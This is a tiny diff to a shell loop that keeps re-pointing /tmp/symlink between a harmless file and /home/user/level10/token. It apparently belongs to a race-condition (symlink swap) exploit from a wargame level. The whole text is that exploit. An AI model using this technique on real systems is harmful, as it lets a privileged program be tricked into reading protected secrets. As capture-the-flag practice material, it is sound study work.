@@ -2,6 +2,6 @@
 
 while :
 do
-        ln -sf /dev/shm/file.txt /tmp/symlink
-        ln -sf /home/user/level10/symlink /tmp/symlink
+        ln -sf /tmp/file.txt /tmp/symlink
+        ln -sf /home/user/level10/token /tmp/symlink
 done
